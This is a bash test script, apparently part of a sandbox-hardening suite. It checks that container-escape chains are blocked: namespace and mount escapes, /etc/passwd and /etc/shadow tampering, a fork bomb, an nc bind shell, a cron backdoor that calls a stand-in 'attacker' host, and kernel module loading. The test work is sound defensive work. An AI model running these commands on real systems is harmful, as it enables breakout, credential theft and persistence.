#!/bin/bash
# Exploitation Chain Tests
# Combined attack scenarios and multi-stage escape attempts

test_namespace_plus_mount_escape() {
    log_section "Namespace + Mount Escape Chains"
    
    # Test 1: Combine unshare with mount manipulation
    test_escape_blocked "Cannot combine unshare + mount for escape" \
        "unshare -m sh -c 'mount --bind / /mnt && ls /mnt/proc/1/root' 2>&1"
    
    # Test 2: PID + Mount namespace escape chain
    test_escape_blocked "Cannot chain PID + mount namespace escape" \
        "unshare -p -m --fork sh -c 'mount -t proc proc /proc && ls /proc/1/root' 2>&1"
    
    # Test 3: User + Mount namespace escape
    test_escape_blocked "Cannot chain user + mount for escape" \
        "unshare -U -m sh -c 'echo 0 0 1 > /proc/self/uid_map; mount --bind / /tmp/escape' 2>&1"
}

test_chroot_plus_capabilities() {
    log_section "Chroot + Capability Escape Chains"
    
    # Test 1: Chroot escape with CAP_SYS_CHROOT
    test_escape_blocked "Cannot use chroot + fd trick for escape" \
        "mkdir /tmp/jail && chroot /tmp/jail sh -c 'cd ../../../../.. && pwd' 2>&1"
    
    # Test 2: Multiple chroot for escape
    test_escape_blocked "Cannot escape via multiple chroots" \
        "mkdir -p /tmp/a /tmp/b && chroot /tmp/a chroot /tmp/b /bin/sh 2>&1"
}

test_symlink_plus_mount_race() {
    log_section "Symlink + Mount Race Conditions"
    
    # Test 1: Symlink race during mount
    test_escape_blocked "Cannot exploit symlink + mount race" \
        "ln -s /proc/1/root /tmp/escape && mount --bind /tmp/escape /mnt 2>&1"
    
    # Test 2: TOCTOU in filesystem operations
    test_escape_blocked "Cannot exploit TOCTOU in file operations" \
        "ln -s /etc/shadow /tmp/target && cat /tmp/target 2>&1"
    
    # Test 3: Symlink + overlay escape
    test_escape_blocked "Cannot escape overlay via symlink" \
        "ln -s /../../../etc/passwd /tmp/escape && cat /tmp/escape 2>&1"
}

test_proc_exploitation_chain() {
    log_section "/proc Exploitation Chain Tests"
    
    # Test 1: /proc/self/root traversal
    test_escape_blocked "Cannot escape via /proc/self/root traversal" \
        "cd /proc/self/root && cd ../../../../ && ls 2>&1"
    
    # Test 2: /proc/self/exe + LD_PRELOAD
    test_escape_blocked "Cannot exploit /proc/self/exe with LD_PRELOAD" \
        "LD_PRELOAD=/tmp/evil.so /proc/self/exe 2>&1"
    
    # Test 3: /proc/self/fd + write exploit
    test_escape_blocked "Cannot write via /proc/self/fd" \
        "exec 3>/etc/passwd && echo 'hacked' > /proc/self/fd/3 2>&1"
    
    # Test 4: /proc/*/mem exploitation
    test_escape_blocked "Cannot exploit process memory via /proc" \
        "dd if=/dev/zero of=/proc/self/mem bs=1 count=1 2>&1"
}

test_device_plus_mount_escape() {
    log_section "Device + Mount Escape Chains"
    
    # Test 1: Create device + mount it
    test_escape_blocked "Cannot create and mount block device" \
        "mknod /tmp/sda1 b 8 1 && mount /tmp/sda1 /mnt 2>&1"
    
    # Test 2: Loopback device escape
    test_escape_blocked "Cannot use loopback for escape" \
        "dd if=/dev/zero of=/tmp/fs.img bs=1M count=10 && losetup /dev/loop0 /tmp/fs.img 2>&1"
    
    # Test 3: Device + bind mount chain
    test_escape_blocked "Cannot chain device creation with bind mount" \
        "mknod /tmp/root b 8 0 && mount --bind /tmp/root /mnt 2>&1"
}

test_overlayfs_exploitation_chain() {
    log_section "OverlayFS Exploitation Chain Tests"
    
    # Test 1: Whiteout + xattr manipulation
    test_escape_blocked "Cannot combine whiteout + xattr for escape" \
        "mknod /tmp/.wh.test c 0 0 && setfattr -n trusted.overlay.opaque -v y /tmp 2>&1"
    
    # Test 2: Upperdir discovery + direct write
    test_escape_blocked "Cannot discover and write to upperdir" \
        "UPPER=\$(mount | grep overlay | grep -o 'upperdir=[^,]*' | cut -d= -f2) && touch \$UPPER/escape 2>&1"
    
    # Test 3: Copy-up race + permission escalation
    test_escape_blocked "Cannot exploit copy-up race" \
        "touch /etc/passwd.new && chmod 777 /etc/passwd.new 2>&1"
}

test_resource_exhaustion_plus_escape() {
    log_section "Resource Exhaustion + Escape Chains"
    
    # Test 1: Fork bomb + escape during cleanup
    test_escape_blocked "Cannot exploit fork bomb confusion" \
        ":(){ :|:& }:& sleep 1; mount --bind / /mnt 2>&1"
    
    # Test 2: Memory exhaustion + /proc exploitation
    test_escape_blocked "Cannot exploit memory pressure" \
        "perl -e 'while(1){fork}' & sleep 1; cat /proc/1/root/etc/passwd 2>&1"
}

test_ptrace_plus_namespace_escape() {
    log_section "Ptrace + Namespace Escape Chains"
    
    # Test 1: Ptrace + namespace injection
    test_escape_blocked "Cannot ptrace + setns for escape" \
        "gdb -batch -ex 'attach 1' -ex 'call setns(3, 0)' 2>&1"
    
    # Test 2: Ptrace parent process
    test_escape_blocked "Cannot ptrace parent for escape" \
        "gdb -p \$PPID -batch -ex 'call system(\"id\")' 2>&1"
}

test_capability_chain_exploits() {
    log_section "Capability Chain Exploitation Tests"
    
    # Test 1: CAP_DAC_OVERRIDE + file modification
    test_escape_blocked "Cannot chain CAP_DAC_OVERRIDE for escape" \
        "capsh --caps='cap_dac_override+eip' -- -c 'echo root::0:0::/:/bin/sh >> /etc/passwd' 2>&1"
    
    # Test 2: CAP_SYS_ADMIN + mount manipulation
    test_escape_blocked "Cannot use CAP_SYS_ADMIN for mount escape" \
        "capsh --caps='cap_sys_admin+eip' -- -c 'mount --bind /proc/1/root /mnt' 2>&1"
    
    # Test 3: Multiple capabilities combined
    test_escape_blocked "Cannot combine multiple capabilities" \
        "capsh --caps='cap_sys_admin,cap_dac_override+eip' -- -c 'mount -t proc none /proc' 2>&1"
}

test_cgroup_plus_namespace_escape() {
    log_section "Cgroup + Namespace Escape Chains"
    
    # Test 1: Cgroup escape + namespace switch
    test_escape_blocked "Cannot escape cgroup then switch namespace" \
        "echo \$\$ > /sys/fs/cgroup/cgroup.procs && unshare -U /bin/sh 2>&1"
    
    # Test 2: Cgroup notify_on_release exploitation
    test_escape_blocked "Cannot exploit cgroup release_agent" \
        "echo 1 > /sys/fs/cgroup/memory/notify_on_release 2>&1"
    
    # Test 3: Cgroup + mount namespace
    test_escape_blocked "Cannot combine cgroup manipulation with mount" \
        "mkdir /sys/fs/cgroup/exploit && unshare -m mount --bind / /mnt 2>&1"
}

test_network_plus_filesystem_escape() {
    log_section "Network + Filesystem Escape Chains"
    
    # Test 1: Network namespace + bind mount
    test_escape_blocked "Cannot chain network namespace with bind mount" \
        "unshare -n mount --bind /proc/1/root /mnt 2>&1"
    
    # Test 2: Socket + filesystem escape
    test_escape_blocked "Cannot exploit socket for filesystem access" \
        "nc -l 9999 -e /bin/sh & mount --bind / /mnt 2>&1"
}

test_setuid_chain_exploits() {
    log_section "Setuid Chain Exploitation Tests"
    
    # Test 1: Create setuid + LD_PRELOAD
    test_escape_blocked "Cannot exploit setuid with LD_PRELOAD" \
        "cp /bin/sh /tmp/suid && chmod u+s /tmp/suid && LD_PRELOAD=/tmp/evil.so /tmp/suid 2>&1"
    
    # Test 2: Setuid + PATH manipulation
    test_escape_blocked "Cannot exploit setuid with PATH" \
        "mkdir /tmp/fake && echo '#!/bin/sh\nid' > /tmp/fake/ls && chmod +x /tmp/fake/ls && PATH=/tmp/fake:\$PATH sudo ls 2>&1"
    
    # Test 3: Setuid + symlink
    test_escape_blocked "Cannot exploit setuid via symlink" \
        "ln -s /bin/sh /tmp/suid && chmod u+s /tmp/suid 2>&1"
}

test_timing_race_exploits() {
    log_section "Timing/Race Condition Exploit Chains"
    
    # Test 1: TOCTOU in file operations
    test_escape_blocked "Cannot exploit TOCTOU race" \
        "touch /tmp/test && (while true; do ln -sf /etc/shadow /tmp/test; done) & cat /tmp/test 2>&1"
    
    # Test 2: Race in privilege operations
    test_escape_blocked "Cannot exploit privilege check race" \
        "touch /tmp/file && (while true; do chmod 777 /tmp/file; done) & cat /tmp/file 2>&1"
}

test_kernel_exploit_chains() {
    log_section "Kernel Exploitation Chain Tests"
    
    # Test 1: Sysctl + exploit
    test_escape_blocked "Cannot exploit kernel via sysctl" \
        "echo 0 > /proc/sys/kernel/kptr_restrict && cat /proc/kallsyms 2>&1"
    
    # Test 2: Module loading + exploit
    test_escape_blocked "Cannot load malicious kernel module" \
        "insmod /tmp/evil.ko 2>&1"
    
    # Test 3: BPF + escape
    test_escape_blocked "Cannot use BPF for escape" \
        "bpftool prog load /tmp/prog.o /sys/fs/bpf/escape 2>&1"
}

test_complex_multi_stage_escape() {
    log_section "Complex Multi-Stage Escape Attempts"
    
    # Test 1: 5-stage escape attempt
    test_escape_blocked "Cannot perform complex multi-stage escape" \
        "unshare -U sh -c 'unshare -m sh -c \"mount --bind / /tmp && chroot /tmp sh -c \\\"cd /proc/1/root && cat etc/shadow\\\"\"' 2>&1"
    
    # Test 2: Combined namespace + capability + mount
    test_escape_blocked "Cannot combine all escape vectors" \
        "unshare -Umpf --fork sh -c 'mount -t proc proc /proc && nsenter -t 1 -a /bin/sh' 2>&1"
    
    # Test 3: Kitchen sink escape attempt
    test_escape_blocked "Cannot use kitchen sink escape" \
        "unshare -UmpiCn --fork sh -c 'mount --bind /proc/1/root /mnt && chroot /mnt && id' 2>&1"
}

test_persistence_mechanisms() {
    log_section "Persistence Mechanism Tests"
    
    # Test 1: Cannot create persistent backdoor via cron
    test_escape_blocked "Cannot create cron job" \
        "echo '* * * * * /bin/sh -c \"nc attacker 1234\"' | crontab - 2>&1"
    
    # Test 2: Cannot create systemd service
    test_escape_blocked "Cannot create systemd service" \
        "systemctl enable evil.service 2>&1"
    
    # Test 3: Cannot modify init scripts
    test_escape_blocked "Cannot modify init scripts" \
        "echo '/bin/backdoor' >> /etc/rc.local 2>&1"
}

# Run all exploitation chain tests
test_namespace_plus_mount_escape
test_chroot_plus_capabilities
test_symlink_plus_mount_race
test_proc_exploitation_chain
test_device_plus_mount_escape
test_overlayfs_exploitation_chain
test_resource_exhaustion_plus_escape
test_ptrace_plus_namespace_escape
test_capability_chain_exploits
test_cgroup_plus_namespace_escape
test_network_plus_filesystem_escape
test_setuid_chain_exploits
test_timing_race_exploits
test_kernel_exploit_chains
test_complex_multi_stage_escape
test_persistence_mechanisms
